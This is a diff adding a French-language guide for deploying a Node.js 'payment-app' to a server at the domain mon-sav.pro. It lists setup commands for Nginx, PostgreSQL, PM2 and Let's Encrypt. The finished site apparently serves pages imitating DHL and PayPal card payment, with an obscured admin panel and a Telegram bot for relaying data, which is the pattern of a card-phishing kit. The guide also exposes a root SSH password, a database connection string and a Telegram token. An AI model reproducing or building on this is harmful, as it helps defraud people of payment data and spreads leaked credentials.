@@ -1,0 +1,176 @@
+ssh root@199.247.3.137
+
+6Q)e!84YcsVSB[G(
+
+2️⃣ Installation système (tout en un bloc)
+# Mise à jour système
+sudo apt update && sudo apt upgrade -y
+# Installation Node.js 20
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt install -y nodejs
+# Installation PostgreSQL + Nginx + Git + outils
+sudo apt install -y postgresql postgresql-contrib nginx git ufw
+# Installation PM2
+sudo npm install -g pm2
+# Démarrage des services
+sudo systemctl start postgresql nginx
+sudo systemctl enable postgresql nginx
+
+3️⃣ Configuration PostgreSQL
+sudo -u postgres psql << 'EOF'
+CREATE DATABASE payment_db;
+CREATE USER payment_user WITH ENCRYPTED PASSWORD 'SecurePassword2024!';
+GRANT ALL PRIVILEGES ON DATABASE payment_db TO payment_user;
+ALTER DATABASE payment_db OWNER TO payment_user;
+\q
+EOF
+
+4️⃣ Création répertoire application
+sudo mkdir -p /var/www/payment-app
+sudo chown -R $USER:$USER /var/www/payment-app
+cd /var/www/payment-app
+
+5️⃣ Upload fichiers - DEPUIS VOTRE ORDINATEUR LOCAL
+Ouvrez un NOUVEAU terminal sur votre ordinateur (pas le serveur) :
+
+# Compresser le projet (depuis votre ordinateur)
+cd /chemin/vers/votre/projet
+tar -czf payment-app.tar.gz . --exclude='node_modules' --exclude='dist' --exclude='.git'
+# Upload vers le serveur
+scp payment-app.tar.gz root@199.247.3.137:/var/www/payment-app/
+
+6️⃣ RETOUR SUR LE SERVEUR - Décompresser
+cd /var/www/payment-app
+tar -xzf payment-app.tar.gz
+rm payment-app.tar.gz
+
+7️⃣ Configuration .env
+nano .env
+
+Copiez ceci (avec VOS valeurs) :
+
+DATABASE_URL=postgresql://neondb_owner:npg_Wm9VIU0gvenO@ep-delicate-cake-af0hyp2v.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require
+TELEGRAM_BOT_TOKEN=8332648469:AAG0nSTVcu5DuLsvXEGa0cr5MV_Ae7BB4_g
+TELEGRAM_CHAT_ID=-4843141531
+SESSION_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
+NODE_ENV=production
+PORT=5000
+
+Sauvegarder: Ctrl+X → Y → Entrée
+
+8️⃣ Installation et Build
+# Installation dépendances
+npm install
+# Build frontend
+npm run build
+# Migration base de données
+npm run db:push
+# Créer dossier logs
+mkdir -p logs
+
+9️⃣ Démarrage avec PM2
+# Démarrer l'application
+pm2 start npm --name "payment-app" -- start
+# Sauvegarder config PM2
+pm2 save
+# Démarrage automatique au boot
+pm2 startup systemd
+# ⚠️ IMPORTANT: Copiez et exécutez la commande affichée
+# Vérifier le statut
+pm2 status
+pm2 logs payment-app
+
+🔟 Configuration Nginx (HTTP seulement)
+sudo nano /etc/nginx/sites-available/mon-sav.pro
+
+Copiez ceci :
+
+server {
+    listen 80;
+    listen [::]:80;
+    server_name mon-sav.pro www.mon-sav.pro;
+    location / {
+        proxy_pass http://localhost:5000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection 'upgrade';
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_cache_bypass $http_upgrade;
+        proxy_read_timeout 300s;
+        proxy_connect_timeout 75s;
+    }
+}
+
+Sauvegarder: Ctrl+X → Y → Entrée
+
+Activer le site :
+
+# Lien symbolique
+sudo ln -s /etc/nginx/sites-available/mon-sav.pro /etc/nginx/sites-enabled/
+# Supprimer config par défaut
+sudo rm -f /etc/nginx/sites-enabled/default
+# Tester config
+sudo nginx -t
+# Redémarrer Nginx
+sudo systemctl restart nginx
+
+1️⃣1️⃣ Configuration Firewall
+sudo ufw allow OpenSSH
+sudo ufw allow 'Nginx Full'
+sudo ufw --force enable
+sudo ufw status
+
+1️⃣2️⃣ Installation SSL (Let's Encrypt)
+# Installer Certbot
+sudo apt install certbot python3-certbot-nginx -y
+# Obtenir certificat SSL
+sudo certbot --nginx -d mon-sav.pro -d www.mon-sav.pro
+
+Suivez les instructions :
+
+Entrez votre email
+Acceptez les conditions (Y)
+Rediriger HTTP vers HTTPS : Oui (2)
+Tester le renouvellement automatique :
+
+sudo certbot renew --dry-run
+
+✅ C'EST TERMINÉ !
+Votre application est maintenant accessible :
+
+🌐 Site principal : https://mon-sav.pro
+💳 Page DHL : https://mon-sav.pro/card
+💰 Page PayPal : https://mon-sav.pro/paypal
+💰 PayPal Carte : https://mon-sav.pro/paypal/card
+🔧 Admin : https://mon-sav.pro/panel-x7k9m2n5
+🔧 Commandes utiles
+# Voir logs en temps réel
+pm2 logs payment-app
+# Redémarrer l'app
+pm2 restart payment-app
+# Statut PM2
+pm2 status
+# Logs Nginx erreurs
+sudo tail -f /var/log/nginx/error.log
+# Vérifier certificat SSL
+sudo certbot certificates
+# Renouveler SSL manuellement
+sudo certbot renew
+
+📝 Mise à jour du code
+Quand vous modifiez le code :
+
+# Sur votre ordinateur - upload nouveau tar.gz
+tar -czf payment-app.tar.gz . --exclude='node_modules' --exclude='dist'
+scp payment-app.tar.gz root@199.247.3.137:/var/www/payment-app/
+# Sur le serveur
+cd /var/www/payment-app
+tar -xzf payment-app.tar.gz
+npm install
+npm run build
+pm2 restart payment-app
+
+Tout est prêt ! 🎉 Copiez/collez chaque bloc de commandes dans l'ordre !
